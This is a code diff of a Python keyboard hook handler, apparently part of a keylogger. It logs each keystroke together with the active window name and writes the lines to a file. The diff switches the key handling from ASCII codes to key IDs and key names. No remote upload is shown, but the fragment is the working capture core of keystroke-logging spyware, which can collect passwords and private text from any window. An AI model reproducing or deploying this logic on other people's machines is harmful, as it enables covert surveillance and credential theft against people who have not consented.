@@ -29,7 +29,7 @@ def OnKeyboardEvent(event):
     global line_buffer
     global window_name
 
-    # print 'Ascii:', event.Ascii, chr(event.Ascii) #pressed value
+    # print 'KeyID:', event.KeyID, chr(event.KeyID) #pressed value
 
     """if typing in new window"""  
     if(window_name != event.WindowName):  # if typing in new window
@@ -44,25 +44,25 @@ def OnKeyboardEvent(event):
             window_name = event.WindowName  # set the new window name
 
     """if return or tab key pressed"""
-    if(event.Ascii == 13 or event.Ascii == 9):  # return key
+    if(event.KeyID == 13 or event.KeyID == 9):  # return key
         line_buffer += '\n'
         SaveLineToFile(line_buffer)  # print to file: the line buffer
         line_buffer = ""  # clear the line buffer
         return True  # exit event
 
     """if backspace key pressed"""
-    if(event.Ascii == 8):  # backspace key
+    if(event.KeyID == 8):  # backspace key
         line_buffer = line_buffer[:-1]  # remove last character
         return True  # exit event
 
-    """if non-normal ascii character"""
-    if(event.Ascii < 32 or event.Ascii > 126):
-        if(event.Ascii == 0):  # unknown character (eg arrow key, shift, ctrl, alt)
+    """if non-normal KeyID character"""
+    if(event.KeyID < 32 or event.KeyID > 126):
+        if(event.KeyID == 0):  # unknown character (eg arrow key, shift, ctrl, alt)
             pass  # do nothing
         else:
-            line_buffer = line_buffer + '\n' + str(event.Ascii) + '\n'
+            line_buffer = line_buffer + '\n' + str(event.Key) + '\n'
     else:
-        line_buffer += chr(event.Ascii)  # add pressed character to line buffer
+        line_buffer += event.Key  # add pressed character to line buffer
 
     return True  # pass event to other handlers
 
